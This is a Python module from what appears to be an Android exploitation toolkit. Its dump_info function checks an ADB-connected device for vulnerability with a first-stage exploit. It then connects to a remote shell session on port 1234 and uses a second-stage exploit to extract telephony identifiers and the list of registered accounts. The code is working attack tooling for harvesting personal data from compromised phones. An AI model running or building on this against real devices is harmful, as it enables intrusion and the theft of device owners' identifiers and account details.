from rich.table import Table

from rich.panel import Panel

from .utils import console

from .adb_helper import AdbHelper

from .stage1 import Stage1Exploit

from .stage2 import Stage2Exploit

import datetime

def dump_info(serial: str = None, port: int = 1234):

    console.print("[highlight]Gathering System Information...[/]")

    try:

        devices = AdbHelper.get_connected_devices()

        device = next((d for d in devices if d['serial'] == serial), None) if serial else (devices[0] if devices else None)

        if not device:

            console.print("[error]Device not found.[/]")

            return

        s1 = Stage1Exploit(device_serial=device['serial'])

        properties = {

            "Model": s1.getprop("ro.product.model"),

            "Manufacturer": s1.getprop("ro.product.manufacturer"),

            "Android Version": s1.getprop("ro.build.version.release"),

            "Security Patch": s1.getprop("ro.build.version.security_patch"),

            "Build ID": s1.getprop("ro.build.display.id"),

            "Kernel": s1.shell_execute("uname -r")["stdout"].strip(),

            "SELinux Status": s1.shell_execute("getenforce")["stdout"].strip(),

        }

        vuln_status = "[success]VULNERABLE[/]"

        try:

            etype = s1.exploit_type()

            vuln_status += f" (Type: {etype})"

        except Exception as e:

            vuln_status = f"[error]NOT VULNERABLE: {e}[/]"

        table = Table(title="Device Information", show_header=False, box=None)

        for k, v in properties.items():

            table.add_row(f"[info]{k}:[/]", str(v))

        table.add_row(f"[info]Vulnerability Status:[/]", vuln_status)

        console.print(Panel(table, title=f"Device: {device['serial']}", expand=False))

        from .session import RemoteShellSession

        session = RemoteShellSession(port=port)

        try:

            session.connect()

            s2 = Stage2Exploit(session=session, port=port)

            telephony = s2.get_telephony_info()

            if telephony:

                t_table = Table(title="Telephony Identifiers")

                t_table.add_column("Type")

                t_table.add_column("Value", style="success")

                for k, v in telephony.items():

                    t_table.add_row(k, v)

                console.print(t_table)

            accounts = s2.get_accounts()

            if accounts:

                a_table = Table(title="Registered Accounts")

                a_table.add_column("Name")

                a_table.add_column("Type", style="dim")

                for a in accounts:

                    a_table.add_row(a['name'], a['type'])

                console.print(a_table)

            session.close()

        except Exception as e:

            console.print(f"[dim]Note: Could not connect to exploit for extended info: {e}[/]")

    except Exception as e:

        console.print(f"[error]Error during info dump: {e}[/]")
